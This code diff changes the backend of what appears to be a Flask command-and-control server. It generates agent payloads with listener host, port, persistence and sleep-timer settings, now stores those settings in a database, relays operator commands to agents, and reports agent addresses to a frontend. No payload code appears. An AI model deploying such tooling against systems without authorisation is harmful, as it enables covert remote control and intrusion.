@@ -16,7 +16,7 @@ from flask_jwt_extended import JWTManager, create_access_token, jwt_required, ge
 from dotenv import load_dotenv
 
 from agent_templates import tcp_agent_template, http_agent_template, https_agent_template
-from Servers.tcp_server import start_tcp_server
+from Servers.tcp.tcp_server import start_tcp_server
 from database import init_db,db,Agent,Session,User  
 
 app = Flask(__name__)
@@ -96,7 +96,8 @@ def execute_command():
     data = request.get_json()
     agent_id = data.get('agentId')
     command = data.get('command')
-    
+    #If the command received is shutdown 
+
     # Connect to your TCP server
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect(('127.0.0.1', 62347))
@@ -392,8 +393,29 @@ def generate_payload():
                 lport=lport, 
                 persistence=persistence, 
                 userAgent=userAgent, 
-                sleepTimer=sleepTimer
+                sleepTimer=sleepTimer,
+                agent_id=agent_id
             )
+            # Prepare extra data for storage
+            extra_data = {
+                "name": name,
+                "lhost": lhost,
+                "lport": lport,
+                "type": payload_type,
+                "persistence": persistence,
+                "userAgent": userAgent,
+                "sleepTimer": sleepTimer
+            }
+                # Initialize a new Agent object with the data
+            new_agent = Agent(
+                agent_id=agent_id,
+                protocol=protocol,
+                extra_data=extra_data  # Storing extra data as JSON
+            )
+
+            # Add the new agent to the session and commit to save it to the database
+            db.session.add(new_agent)
+            db.session.commit()
 
             print(agent_code)
         except Exception as e:
@@ -415,8 +437,28 @@ def generate_payload():
             lport=lport, 
             persistence=persistence, 
             userAgent=data['userAgent'], 
-            sleepTimer=data['sleepTimer']
+            sleepTimer=data['sleepTimer'],
+            agent_id=agent_id
         )
+        extra_data = {
+                "name": name,
+                "lhost": lhost,
+                "lport": lport,
+                "type": payload_type,
+                "persistence": persistence,
+                "userAgent": userAgent,
+                "sleepTimer": sleepTimer
+            }
+
+        # Initialize a new Agent object with the data
+        new_agent = Agent(
+            agent_id=agent_id,
+            protocol=protocol,
+            extra_data=extra_data  # Storing extra data as JSON
+        )
+        # Add the new agent to the session and commit to save it to the database
+        db.session.add(new_agent)
+        db.session.commit()
 
     else:
         return jsonify({"error": "Invalid protocol specified"}), 400
@@ -447,24 +489,25 @@ def handle_connect():
     # Optionally, you can emit a message back to the newly connected client
     emit('connection_status', {'message': 'Successfully connected to the server'})
 
-def notify_frontend(agent_id, agent_name=None):
-    """Function to notify the frontend about an agent's status, including the agent's name."""
+def notify_frontend(agent_id, agent_name=None, addr=None):
+    """Function to notify the frontend about an agent's status, including the agent's name, type, and address."""
     with app.app_context():
         session = Session()
         agent = session.query(Agent).filter_by(agent_id=agent_id).first()
         if agent:
-            # Include agent name in the print statement if available
-            agent_info = f"Agent Data: ID={agent.agent_id}, Name={agent_name or 'Unknown'}, Protocol={agent.protocol}, Last Seen={agent.last_seen}"
-            print(agent_info)
+            # Constructing a detailed message for logging
+            #agent_info = f"Agent Data: ID={agent.agent_id}, Name={agent_name or 'Unknown'}, Type={agent.type}, Protocol={agent.protocol}, Last Seen={agent.last_seen}, Address={addr or 'Unknown'}"
+            #print(agent_info)
             print("-------------------------------------------------------")
             print("EMIT EMIT")
             print("-------------------------------------------------------")
-            # Include agent's name in the data sent to the frontend
+            # Emitting an update to the frontend with comprehensive agent details
             socketio.emit('agent_update', {
                 'agent_id': agent.agent_id,
-                'agent_name': agent_name or 'Unknown',  # Use the provided name or fallback to 'Unknown'
-                'protocol': agent.protocol,
-                'last_seen': agent.last_seen.strftime('%Y-%m-%d %H:%M:%S')
+                'agent_name': agent_name or 'Unknown',
+                'protocol': agent.protocol.upper(),
+                'last_seen': agent.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
+                'address': addr or 'Unknown'  # Include address in the emitted data
             })
         session.close()
 
@@ -473,13 +516,13 @@ def notify_agent_connection():
     data = request.json
     agent_id = data.get('agent_id')
     agent_name = data.get('agent_name')  # Retrieve agent's name from the request data
+    addr = data.get('addr')  # Retrieve address from the request data
 
     if agent_id:
-        # Pass both agent_id and agent_name to the notify_frontend function
-        notify_frontend(agent_id, agent_name)
+        # Pass agent_id, agent_name, and address to the notify_frontend function
+        notify_frontend(agent_id, agent_name, addr)
         return jsonify({'status': 'success', 'agent_name': agent_name}), 200
     return jsonify({'error': 'Missing agent_id'}), 400
-
 
 if __name__ == "__main__":
     #app.run(debug=True, port=5002)
